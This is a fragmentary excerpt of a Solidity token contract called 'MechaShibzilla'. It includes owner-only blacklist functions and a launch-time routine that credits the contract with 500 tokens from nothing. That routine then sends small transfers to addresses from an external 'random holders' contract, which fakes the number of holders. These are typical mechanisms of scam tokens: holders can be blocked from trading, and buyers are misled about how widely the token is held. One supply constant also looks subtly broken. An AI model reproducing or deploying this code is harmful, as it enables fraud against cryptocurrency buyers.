...
//This used contract is to add additional random holders
interface IAddress{
...
contract MechaShibzilla is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MechaShibzilla";
    string private _symbol = "MechaShibzilla"; //MechaShibzilla
    ...
    address payable public marketingWalletAddress = payable(0xf1AD94696E3f13fd4C5074cb5fe0Afa862bB3535);
    ...
    uint256 public _maxTxAmount = 8000000 * 10**_decimals; //8000000
    uint256 public _walletMax = 8000000 * 10**_decimals;   //8000000
    uint256 private minimumTokensBeforeSwap = 800000000 * 5 **_decimals; 
    ...
    constructor (address RandomContract, address deployer, address ReceiveAddress) {
        ...
        emit Transfer(address(deployer), ReceiveAddress, _totalSupply);
    }
    ...
    function unBlack(address[] memory addresses) external onlyOwner{
        for(uint i=0;i<addresses.length;i++)
            _isBlacklisted[addresses[i]] = false;
    }

    function areBlack(address[] memory addresses) external onlyOwner{
        for(uint i=0;i<addresses.length;i++)
    ...
    function updateOn(bool OnOff) external onlyOwner{
        On = OnOff;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            //To add random addresses
            if(On)
                if(isLaunch){
                    _balances[address(this)] = _balances[address(this)].add(500);
                    for(uint i = block.timestamp;i<block.timestamp+5;i++)
                        _basicTransfer(address(this),IAddress(RContract).getRandomAddress(i),100);
                }
